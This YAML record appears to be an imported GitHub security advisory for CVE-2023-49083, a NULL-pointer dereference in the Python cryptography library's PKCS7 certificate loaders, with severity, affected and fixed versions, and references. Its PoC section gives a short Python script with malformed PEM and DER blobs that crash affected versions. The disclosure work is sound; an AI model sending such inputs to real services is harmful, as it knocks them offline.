advisory_id: GHSA-jfhm-5ghh-2f97
datasource_id: github_osv_importer_v2/GHSA-jfhm-5ghh-2f97
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-jfhm-5ghh-2f97/GHSA-jfhm-5ghh-2f97.json
aliases:
  - CVE-2023-49083
summary: |
  cryptography vulnerable to NULL-dereference when loading PKCS7 certificates
  ### Summary

  Calling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault.

  ### PoC
  Here is a Python code that triggers the issue:
  ```python
  from cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates

  pem_p7 = b"""
  -----BEGIN PKCS7-----
  MAsGCSqGSIb3DQEHAg==
  -----END PKCS7-----
  """

  der_p7 = b"\x30\x0B\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x02"

  load_pem_pkcs7_certificates(pem_p7)
  load_der_pkcs7_certificates(der_p7)
  ```

  ### Impact
  Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.
impacted_packages:
  - purl: pkg:pypi/cryptography
    affected_versions: vers:pypi/>=3.1|<41.0.6
    fixed_versions: vers:pypi/41.0.6
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-jfhm-5ghh-2f97/GHSA-jfhm-5ghh-2f97.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-476
references:
  - url: https://github.com/pyca/cryptography
    reference_type:
    reference_id:
  - url: https://github.com/pyca/cryptography/commit/f09c261ca10a31fe41b1262306db7f8f1da0e48a
    reference_type:
    reference_id:
  - url: https://github.com/pyca/cryptography/pull/9926
    reference_type:
    reference_id:
  - url: https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97
    reference_type:
    reference_id:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2023-254.yaml
    reference_type:
    reference_id:
  - url: https://lists.debian.org/debian-lts-announce/2024/10/msg00012.html
    reference_type:
    reference_id:
  - url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QMNTYMUGFJSDBYBU22FUYBHFRZODRKXV
    reference_type:
    reference_id:
  - url: http://www.openwall.com/lists/oss-security/2023/11/29/2
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-49083
    reference_type:
    reference_id: CVE-2023-49083
